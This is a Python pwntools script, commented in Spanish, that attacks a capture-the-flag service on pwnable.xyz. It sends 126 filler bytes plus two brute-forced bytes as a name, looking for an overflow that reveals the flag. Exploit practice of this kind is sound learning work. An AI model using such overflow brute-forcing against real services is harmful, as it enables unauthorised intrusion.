#!/usr/bin/env python3

from pwn import *
import time

# Probar diferentes combinaciones de bytes en las últimas posiciones
# para ver si alguna combinación mágica revela la flag

found = False

for b1 in [0x01, 0x10, 0x20, 0x40, 0x60, 0x80, 0xff]:
    if found:
        break
    for b2 in [0x01, 0x10, 0x20, 0x40, 0x60, 0x80, 0xff]:
        conn = remote('svc.pwnable.xyz', 30004)
        
        conn.recvuntil(b'[y/N]: ')
        conn.send(b'y\n')
        
        conn.recvuntil(b'Name: ')
        
        # 126 bytes + 2 bytes específicos
        payload = b'A' * 126 + bytes([b1, b2])
        conn.send(payload)
        
        time.sleep(0.3)
        
        data = conn.recvall(timeout=2)
        
        if b'FLAG{' in data and b'will_be_here' not in data:
            log.success(f"¡FLAG ENCONTRADA con bytes 0x{b1:02x} 0x{b2:02x}!")
            log.success(f"Data: {data}")
            found = True
            break
        
        conn.close()
        time.sleep(0.2)

if not found:
    log.warning("No se encontró con ninguna combinación")
EOF